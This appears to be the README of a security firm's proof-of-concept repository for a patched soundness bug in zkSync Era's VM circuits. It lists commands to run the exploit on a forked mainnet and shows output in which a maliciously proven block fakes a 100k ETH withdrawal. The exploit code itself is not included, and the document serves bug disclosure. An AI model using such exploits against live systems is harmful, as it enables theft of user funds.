# zkSync Era Circuit Bug Exploit PoC

This repo contains a proof-of-concept exploit for a soundness bug in the zkSync Era VM circuits found by ChainLight. For more details on the bug, check out the [full write-up](TODO).

## Running the PoC

From this repo, run
```
export RPC_MAINNET=[your mainnet RPC url]

# optional: copy the pre-populated storage slot cache for the target block
# this speeds up the PoC and avoids greatly reduces queries to your RPC url
mkdir -p $HOME/.foundry/cache/rpc/mainnet && cp data/18083999 $HOME/.foundry/cache/rpc/mainnet

forge test -vv
```

The PoC will fork mainnet at a block before the issue was patched, and submit and execute a maliciously proven block. The malicious block exploits the soundess issue by emitting a false withdrawal for 100k ETH.

Note: the PoC will need to access many storage slots, so will query the RPC url many times. If you'd like to speed this up or reduce the number of queries, you can use the pre-populated foundry fork cache.

The expected output is

```
Running 1 test for src/PoC.sol:PoC
[PASS] testExploit() (gas: 1021668869)
Logs:
  replaying proofs for previously committed blocks...
  executing previously committed blocks...
  199391
  committing exploit block...
  proving exploit block...
  executing exploit block...
  balance before withdrawal:  3221289529119249900
  balance after withdrawal:  100003020934235865065763
```
